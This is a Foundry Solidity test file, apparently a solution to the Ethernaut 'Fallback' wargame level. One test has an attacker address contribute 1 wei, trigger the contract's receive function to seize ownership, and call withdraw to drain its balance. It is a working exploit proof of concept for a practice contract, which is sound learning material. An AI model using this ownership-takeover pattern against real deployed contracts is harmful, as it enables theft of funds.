// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";


contract FallbackTest is Test {

    event Owner(address owner);

    Fallback fallBack;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    uint256 attackerBalance = 1_000 wei;

    function setUp() public {

        vm.deal(attacker,attackerBalance);

        vm.prank(owner);
        fallBack = new Fallback();

        console.log(address(fallBack));
    }

    function test_Owner() public {
        assertEq(fallBack.owner(),owner);
        console.log("Owner of the contract ",fallBack.owner());
        console.log("contract balance ",address(fallBack).balance);
    }

    function test_AttackFallBack() public {
        vm.startPrank(attacker);
        fallBack.contribute{value:1 wei}();
        (bool success,) = address(fallBack).call{value:1 wei}("");
        require(success,"transfer failed");
        fallBack.withdraw();
        vm.stopPrank();

        emit Owner(fallBack.owner());

        console.log("Owner of the contract ", fallBack.owner());
        
    }





}